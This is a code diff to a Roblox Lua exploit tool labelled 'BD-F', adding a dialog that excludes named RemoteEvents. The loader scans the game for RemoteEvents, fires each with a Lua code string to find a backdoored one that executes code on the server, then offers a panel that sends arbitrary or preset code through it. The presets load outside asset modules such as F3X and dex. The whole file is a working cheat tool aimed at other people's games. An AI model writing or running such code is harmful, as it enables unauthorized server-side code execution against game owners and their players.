@@ -41,13 +41,21 @@ TextButton23 = Instance.new("TextButton")
 LocalScript24 = Instance.new("LocalScript")
 TextButton25 = Instance.new("TextButton")
 LocalScript26 = Instance.new("LocalScript")
+Frame27 = Instance.new("Frame")
+LocalScript28 = Instance.new("LocalScript")
+TextBox29 = Instance.new("TextBox")
+TextButton30 = Instance.new("TextButton")
+LocalScript31 = Instance.new("LocalScript")
+TextLabel32 = Instance.new("TextLabel")
+StringValue33 = Instance.new("StringValue")
 ScreenGui0.Name = "zza"
 ScreenGui0.Parent = mas
 ScreenGui0.ResetOnSpawn = false
 ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Frame1.Name = "LoadingUI"
 Frame1.Parent = ScreenGui0
-Frame1.Position = UDim2.new(0.499078393, 0, 0.499235392, 0)
+Frame1.Position = UDim2.new(0.5, 0, -0.5, 0)
+Frame1.Visible = false
 Frame1.Size = UDim2.new(0, 301, 0, 100)
 Frame1.Active = true
 Frame1.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -68,35 +76,44 @@ Gradient1.Parent = Frame1
 
 LocalScript2.Parent = Frame1
 table.insert(cors,sandbox(LocalScript2,function()
-	script.Parent.Parent.ResetOnSpawn = false
+repeat wait() until script.Parent.Parent:FindFirstChild("ready")
 
-	local txt = script.Parent.Status
+script.Parent.Visible = true
 
-	txt.Text = [[Initialized!
+script.Parent.Position = UDim2.new(0.5,0,0.5,0)
+
+script.Parent.Parent.ready:Destroy()
+
+script.Parent.Parent.ResetOnSpawn = false
+
+local txt = script.Parent.Status
+
+txt.Text = [[Initialized!
 Finding all RemoteEvents..
-.Find RE backdoor
-.Pass backdoored RE
-.Load MainUI with fancy anims]]
+•Find RE backdoor
+•Pass backdoored RE
+•Load MainUI with fancy anims]]
 
-	wait(1)
+wait(1)
 
-	local remotes = {}
-	for i,v in pairs(game:GetDescendants()) do
-		if v:IsA("RemoteEvent") then
-			print("Found remote: game."..v:GetFullName())
-			remotes[i] = v
-		end
+local remotes = {}
+for i,v in pairs(game:GetDescendants()) do
+	if v:IsA("RemoteEvent") then
+		print("Found remote: game."..v:GetFullName())
+		remotes[i] = v
 	end
+end
 
-	txt.Text = [[Initialized!
+txt.Text = [[Initialized!
 Found all RemoteEvents!
 Finding a backdoor..
-.Pass backdoored RE
-.Load MainUI with fancy anims]]
+•Pass backdoored RE
+•Load MainUI with fancy anims]]
 
-	wait(0.1)
+wait(0.1)
 
-	for i,remote in pairs(remotes) do
+for i,remote in pairs(remotes) do
+	if not string.match(script.Parent.Parent.exclude.Value, remote.Name) then
 		remote:FireServer("local i = Instance.new('BoolValue') i.Name = 'i' i.Value = true i.Parent = game.ReplicatedStorage")
 		wait(0.125)
 		if game.ReplicatedStorage:FindFirstChild("i") then
@@ -114,52 +131,53 @@ Loading MainUI...]]
 			game.ReplicatedStorage:FindFirstChild("i"):Destroy()
 		end
 	end
+end
 
-	if script.Parent.Parent.re.Value == nil then
-		txt.Text = [[Initialized!
+if script.Parent.Parent.re.Value == nil then
+	txt.Text = [[Initialized!
 Found all RemoteEvents!
 Failed to find a backdoor!
-.Pass backdoored RE
-.Load MainUI with fancy anims]]
-		wait(5)
-		script.Disabled = true
-		script.Parent.Parent:Destroy()
-		return
-	else
-		print("Found vulnerability: game."..script.Parent.Parent.re.Value:GetFullName())
-	end
+•Pass backdoored RE
+•Load MainUI with fancy anims]]
+	wait(5)
+	script.Disabled = true
+	script.Parent.Parent:Destroy()
+	return
+else
+	print("Found vulnerability: game."..script.Parent.Parent.re.Value:GetFullName())
+end
 
-	wait(0.1)
+wait(0.1)
 
-	txt.Text = [[Initialized!
+txt.Text = [[Initialized!
 Found all RemoteEvents!
 Found a backdoor!
 Passed backdoor RE!
 Loaded MainUI!]]
 
-	local ts = game:GetService("TweenService")
+local ts = game:GetService("TweenService")
 
-	local tp = UDim2.new(0.5, 0, -1, 0)
+local tp = UDim2.new(0.5, 0, -1, 0)
 
-	local ti = TweenInfo.new(2, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
-	local t = ts:Create(script.Parent, ti, {Position = tp})
+local ti = TweenInfo.new(2, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
+local t = ts:Create(script.Parent, ti, {Position = tp})
 
-	t:Play()
+t:Play()
 
-	wait(2)
+wait(2)
 
-	script.Parent.Parent.MainUI.Visible = true
-	script.Parent.Parent.MainUI.Active = true
+script.Parent.Parent.MainUI.Visible = true
+script.Parent.Parent.MainUI.Active = true
 
-	tp = UDim2.new(0.5,0,0.5,0)
+tp = UDim2.new(0.5,0,0.5,0)
 
-	t = ts:Create(script.Parent.Parent.MainUI, ti, {Position = tp})
+t = ts:Create(script.Parent.Parent.MainUI, ti, {Position = tp})
 
-	t:Play()
+t:Play()
 
-	wait(2)
+wait(2)
 
-	script.Parent:Destroy()
+script.Parent:Destroy()
 end))
 TextLabel3.Name = "Status"
 TextLabel3.Parent = Frame1
@@ -183,44 +201,44 @@ TextLabel3.TextYAlignment = Enum.TextYAlignment.Top
 LocalScript4.Name = "drag"
 LocalScript4.Parent = Frame1
 table.insert(cors,sandbox(LocalScript4,function()
-	--Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
-	--Put this inside of your Frame and configure the speed if you would like.
-	--Enjoy! Credits go to: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
+--Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
+--Put this inside of your Frame and configure the speed if you would like.
+--Enjoy! Credits go to: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
 
-	local UIS = game:GetService('UserInputService')
-	local frame = script.Parent
-	local dragToggle = nil
-	local dragSpeed = 0.25
-	local dragStart = nil
-	local startPos = nil
+local UIS = game:GetService('UserInputService')
+local frame = script.Parent
+local dragToggle = nil
+local dragSpeed = 0.25
+local dragStart = nil
+local startPos = nil
 
-	local function updateInput(input)
-		local delta = input.Position - dragStart
-		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
-	end
+local function updateInput(input)
+	local delta = input.Position - dragStart
+	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+end
 
-	frame.InputBegan:Connect(function(input)
-		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
-			dragToggle = true
-			dragStart = input.Position
-			startPos = frame.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragToggle = false
-				end
-			end)
-		end
-	end)
-
-	UIS.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-			if dragToggle then
-				updateInput(input)
+frame.InputBegan:Connect(function(input)
+	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+		dragToggle = true
+		dragStart = input.Position
+		startPos = frame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragToggle = false
 			end
+		end)
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		if dragToggle then
+			updateInput(input)
 		end
-	end)
+	end
+end)
 
 end))
 ObjectValue5.Name = "re"
@@ -266,9 +284,9 @@ TextButton8.TextWrap = true
 TextButton8.TextWrapped = true
 LocalScript9.Parent = TextButton8
 table.insert(cors,sandbox(LocalScript9,function()
-	script.Parent.MouseButton1Down:Connect(function()
-		script.Parent.Parent.Parent.code.Text = "require(4869378421).F3X('%username%')"
-	end)
+script.Parent.MouseButton1Down:Connect(function()
+	script.Parent.Parent.Parent.code.Text = "require(4869378421).F3X('%username%')"
+end)
 end))
 TextButton10.Name = "dex"
 TextButton10.Parent = ScrollingFrame7
@@ -290,9 +308,9 @@ TextButton10.TextWrap = true
 TextButton10.TextWrapped = true
 LocalScript11.Parent = TextButton10
 table.insert(cors,sandbox(LocalScript11,function()
-	script.Parent.MouseButton1Down:Connect(function()
-		script.Parent.Parent.Parent.code.Text = "require(4786706026):dex('%username%')"
-	end)
+script.Parent.MouseButton1Down:Connect(function()
+	script.Parent.Parent.Parent.code.Text = "require(4786706026):dex('%username%')"
+end)
 end))
 TextButton12.Name = "h-loversgui"
 TextButton12.Parent = ScrollingFrame7
@@ -314,9 +332,9 @@ TextButton12.TextWrap = true
 TextButton12.TextWrapped = true
 LocalScript13.Parent = TextButton12
 table.insert(cors,sandbox(LocalScript13,function()
-	script.Parent.MouseButton1Down:Connect(function()
-		script.Parent.Parent.Parent.code.Text = "require(5346235551).B1847('%username%')"
-	end)
+script.Parent.MouseButton1Down:Connect(function()
+	script.Parent.Parent.Parent.code.Text = "require(5346235551).B1847('%username%')"
+end)
 end))
 TextButton14.Name = "r6"
 TextButton14.Parent = ScrollingFrame7
@@ -338,9 +356,9 @@ TextButton14.TextWrap = true
 TextButton14.TextWrapped = true
 LocalScript15.Parent = TextButton14
 table.insert(cors,sandbox(LocalScript15,function()
-	script.Parent.MouseButton1Down:Connect(function()
-		script.Parent.Parent.Parent.code.Text = "require(4585652241).load('%username%')"
-	end)
+script.Parent.MouseButton1Down:Connect(function()
+	script.Parent.Parent.Parent.code.Text = "require(4585652241).load('%username%')"
+end)
 end))
 TextButton16.Name = "originalchar"
 TextButton16.Parent = ScrollingFrame7
@@ -362,9 +380,9 @@ TextButton16.TextWrap = true
 TextButton16.TextWrapped = true
 LocalScript17.Parent = TextButton16
 table.insert(cors,sandbox(LocalScript17,function()
-	script.Parent.MouseButton1Down:Connect(function()
-		script.Parent.Parent.Parent.code.Text = "game.Players.%username%:LoadCharacter() game.Players.%username%.Character.LeftFoot.CFrame = game.Workspace.%username%.%username%.CFrame game.Workspace.%username%:Destroy()"
-	end)
+script.Parent.MouseButton1Down:Connect(function()
+	script.Parent.Parent.Parent.code.Text = "game.Players.%username%:LoadCharacter() game.Players.%username%.Character.LeftFoot.CFrame = game.Workspace.%username%.%username%.CFrame game.Workspace.%username%:Destroy()"
+end)
 end))
 TextBox18.Name = "code"
 TextBox18.Parent = Frame6
@@ -395,7 +413,7 @@ TextLabel19.BackgroundTransparency = 1
 TextLabel19.BorderColor = BrickColor.new("Really black")
 TextLabel19.BorderColor3 = Color3.new(0, 0, 0)
 TextLabel19.BorderSizePixel = 0
-TextLabel19.Font = Enum.Font.SourceSans
+TextLabel19.Font = Enum.Font.SourceSansBold
 TextLabel19.FontSize = Enum.FontSize.Size14
 TextLabel19.Text = "BD-F (Credits - AlmousMarvelous, QuickQuarnt)"
 TextLabel19.TextColor = BrickColor.new("Institutional white")
@@ -407,40 +425,40 @@ TextLabel19.TextWrapped = true
 LocalScript20.Name = "drag"
 LocalScript20.Parent = TextLabel19
 table.insert(cors,sandbox(LocalScript20,function()
-	local UIS = game:GetService('UserInputService')
-	local frame = script.Parent.Parent
-	local dragToggle = nil
-	local dragSpeed = 0.5
-	local dragStart = nil
-	local startPos = nil
+local UIS = game:GetService('UserInputService')
+local frame = script.Parent.Parent
+local dragToggle = nil
+local dragSpeed = 0.5
+local dragStart = nil
+local startPos = nil
 
-	local function updateInput(input)
-		local delta = input.Position - dragStart
-		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
-	end
+local function updateInput(input)
+	local delta = input.Position - dragStart
+	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+end
 
-	frame.InputBegan:Connect(function(input)
-		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
-			dragToggle = true
-			dragStart = input.Position
-			startPos = frame.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragToggle = false
-				end
-			end)
-		end
-	end)
-
-	UIS.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-			if dragToggle then
-				updateInput(input)
+frame.InputBegan:Connect(function(input)
+	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+		dragToggle = true
+		dragStart = input.Position
+		startPos = frame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragToggle = false
 			end
+		end)
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		if dragToggle then
+			updateInput(input)
 		end
-	end)
+	end
+end)
 
 end))
 TextButton21.Name = "Run"
@@ -463,16 +481,16 @@ TextButton21.TextWrap = true
 TextButton21.TextWrapped = true
 LocalScript22.Parent = TextButton21
 table.insert(cors,sandbox(LocalScript22,function()
-	script.Parent.MouseButton1Down:Connect(function()
-		local code = script.Parent.Parent.code.Text
-		local re = script.Parent.Parent.Parent.re.Value
+script.Parent.MouseButton1Down:Connect(function()
+	local code = script.Parent.Parent.code.Text
+	local re = script.Parent.Parent.Parent.re.Value
 
-		code = string.gsub(code, "%%username%%", game.Players.LocalPlayer.Name)
+	code = string.gsub(code, "%%username%%", game.Players.LocalPlayer.Name)
+	
+	print(code)
 
-		print(code)
-
-		re:FireServer(tostring(code))
-	end)
+	re:FireServer(tostring(code))
+end)
 end))
 TextButton23.Name = "Clear"
 TextButton23.Parent = Frame6
@@ -494,9 +512,9 @@ TextButton23.TextWrap = true
 TextButton23.TextWrapped = true
 LocalScript24.Parent = TextButton23
 table.insert(cors,sandbox(LocalScript24,function()
-	script.Parent.MouseButton1Down:Connect(function()
-		script.Parent.Parent.code.Text = "";
-	end)
+script.Parent.MouseButton1Down:Connect(function()
+	script.Parent.Parent.code.Text = "";
+end)
 end))
 TextButton25.Name = "Exit"
 TextButton25.Parent = Frame6
@@ -518,10 +536,144 @@ TextButton25.TextWrap = true
 TextButton25.TextWrapped = true
 LocalScript26.Parent = TextButton25
 table.insert(cors,sandbox(LocalScript26,function()
-	script.Parent.MouseButton1Down:Connect(function()
-		script.Parent.Parent.Parent:Destroy()
-	end)
+script.Parent.MouseButton1Down:Connect(function()
+	script.Parent.Parent.Parent:Destroy()
+end)
 end))
+Frame27.Name = "ExclusionUI"
+Frame27.Parent = ScreenGui0
+Frame27.Position = UDim2.new(0.499078393, 0, 0.499235392, 0)
+Frame27.Size = UDim2.new(0, 301, 0, 100)
+Frame27.Active = true
+Frame27.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame27.BackgroundColor = BrickColor.new("Institutional white")
+Frame27.BackgroundColor3 = Color3.new(1, 1, 1)
+Frame27.BorderColor = BrickColor.new("Really black")
+Frame27.BorderColor3 = Color3.new(0, 0, 0)
+Frame27.BorderSizePixel = 0
+Frame27.ZIndex = 0
+local Gradient2 = Instance.new("UIGradient")
+Gradient2.Name = "Gradient1"
+Gradient2.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
+})
+Gradient2.Rotation = 230
+Gradient2.Parent = Frame27
+
+LocalScript28.Name = "drag"
+LocalScript28.Parent = Frame27
+table.insert(cors,sandbox(LocalScript28,function()
+--Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
+--Put this inside of your Frame and configure the speed if you would like.
+--Enjoy! Credits go to: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
+
+local UIS = game:GetService('UserInputService')
+local frame = script.Parent
+local dragToggle = nil
+local dragSpeed = 0.25
+local dragStart = nil
+local startPos = nil
+
+local function updateInput(input)
+	local delta = input.Position - dragStart
+	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+end
+
+frame.InputBegan:Connect(function(input)
+	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+		dragToggle = true
+		dragStart = input.Position
+		startPos = frame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragToggle = false
+			end
+		end)
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		if dragToggle then
+			updateInput(input)
+		end
+	end
+end)
+
+end))
+TextBox29.Parent = Frame27
+TextBox29.Position = UDim2.new(0, 0, 0.123609617, 0)
+TextBox29.Size = UDim2.new(0, 301, 0, 63)
+TextBox29.BackgroundColor = BrickColor.new("Institutional white")
+TextBox29.BackgroundColor3 = Color3.new(1, 1, 1)
+TextBox29.BackgroundTransparency = 1
+TextBox29.BorderColor = BrickColor.new("Really black")
+TextBox29.BorderColor3 = Color3.new(0, 0, 0)
+TextBox29.BorderSizePixel = 0
+TextBox29.Font = Enum.Font.SourceSans
+TextBox29.FontSize = Enum.FontSize.Size18
+TextBox29.Text = ""
+TextBox29.TextColor = BrickColor.new("Institutional white")
+TextBox29.TextColor3 = Color3.new(1, 1, 1)
+TextBox29.TextSize = 18
+TextBox29.TextWrap = true
+TextBox29.TextWrapped = true
+TextBox29.TextXAlignment = Enum.TextXAlignment.Left
+TextBox29.TextYAlignment = Enum.TextYAlignment.Top
+TextBox29.PlaceholderColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+TextBox29.PlaceholderText = "List all RemoteEvent names to exclude.."
+TextButton30.Name = "Exclude"
+TextButton30.Parent = Frame27
+TextButton30.Position = UDim2.new(0, 0, 0, 77)
+TextButton30.Size = UDim2.new(0, 301, 0, 23)
+TextButton30.BackgroundColor = BrickColor.new("Black")
+TextButton30.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
+TextButton30.BorderColor = BrickColor.new("Really black")
+TextButton30.BorderColor3 = Color3.new(0, 0, 0)
+TextButton30.BorderSizePixel = 0
+TextButton30.Font = Enum.Font.Nunito
+TextButton30.FontSize = Enum.FontSize.Size14
+TextButton30.Text = "Exclude"
+TextButton30.TextColor = BrickColor.new("Really black")
+TextButton30.TextColor3 = Color3.new(0, 0, 0)
+TextButton30.TextScaled = true
+TextButton30.TextSize = 14
+TextButton30.TextWrap = true
+TextButton30.TextWrapped = true
+LocalScript31.Parent = TextButton30
+table.insert(cors,sandbox(LocalScript31,function()
+script.Parent.MouseButton1Down:Connect(function()
+	script.Parent.Parent.Parent.exclude.Value = script.Parent.Parent.TextBox.Text
+	local rdy = Instance.new("BoolValue")
+	rdy.Name = "ready"
+	rdy.Value = true
+	rdy.Parent = script.Parent.Parent.Parent
+	script.Parent.Parent:Destroy()
+end)
+end))
+TextLabel32.Name = "title"
+TextLabel32.Parent = Frame27
+TextLabel32.Position = UDim2.new(0, 0, -0.00639038067, 0)
+TextLabel32.Size = UDim2.new(0, 301, 0, 13)
+TextLabel32.BackgroundColor = BrickColor.new("Black")
+TextLabel32.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
+TextLabel32.BorderColor = BrickColor.new("Really black")
+TextLabel32.BorderColor3 = Color3.new(0, 0, 0)
+TextLabel32.BorderSizePixel = 0
+TextLabel32.Font = Enum.Font.SourceSansBold
+TextLabel32.FontSize = Enum.FontSize.Size14
+TextLabel32.Text = "BD-F - Credits to QuickQuarnt & AlmousMarvelous"
+TextLabel32.TextColor = BrickColor.new("Institutional white")
+TextLabel32.TextColor3 = Color3.new(1, 1, 1)
+TextLabel32.TextSize = 14
+TextLabel32.TextWrap = true
+TextLabel32.TextWrapped = true
+TextLabel32.TextXAlignment = Enum.TextXAlignment.Left
+StringValue33.Name = "exclude"
+StringValue33.Parent = ScreenGui0
 for i,v in pairs(mas:GetChildren()) do
 	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
 	pcall(function() v:MakeJoints() end)
